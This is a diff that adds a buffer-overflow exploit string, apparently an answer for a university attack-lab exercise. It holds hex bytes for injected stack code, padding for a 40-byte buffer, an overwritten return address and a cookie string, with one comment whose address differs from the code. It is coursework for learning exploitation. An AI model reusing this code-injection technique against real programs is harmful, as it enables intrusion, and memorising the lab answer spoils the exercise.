@@ -1,0 +1,15 @@
+/* start of the buffer with lower address */
+48 c7 c7 a8 dc 61 55 	/* mov    $0x5561dca8,%rdi */
+68 fa 18 40 00       	/* pushq  $0x4018fa */
+c3                   	/* retq */                   
+/* 13 bytes */
+               30 30 30 
+30 30 30 30 30 30 30 30  /* eight dumpy chars */
+30 30 30 30 30 30 30 30  
+30 30 30 30 30 30 30 30  /* buffer size is 0x28=40 */
+/* end of buffer with higher address */
+
+78 dc 61 55 00 00 00 00  /* address of the start of the buffer (using gdb to print out $rsp) */
+
+35 39 62 39 39 37 66 61  /* addr = 0x5562dca8 */ 
+00			 /* str(cookie) is "59b997fa" and dont forget '\0' */
